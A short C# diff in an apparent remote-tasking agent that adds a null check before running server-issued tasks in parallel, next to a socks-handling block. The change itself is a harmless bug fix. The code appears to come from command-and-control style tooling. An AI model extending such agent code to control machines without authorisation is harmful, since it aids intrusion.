@@ -125,10 +125,13 @@ namespace Agent
                 return;
             }
 
-            Parallel.ForEach(args.tasking_response.tasks, async task =>
+            if(args.tasking_response.tasks is not null)
             {
-                this.taskManager.StartTaskAsync(new ServerJob(task));
-            });
+                Parallel.ForEach(args.tasking_response.tasks, async task =>
+                {
+                    this.taskManager.StartTaskAsync(new ServerJob(task));
+                });
+            }
 
             if (args.tasking_response.socks is not null)
             {
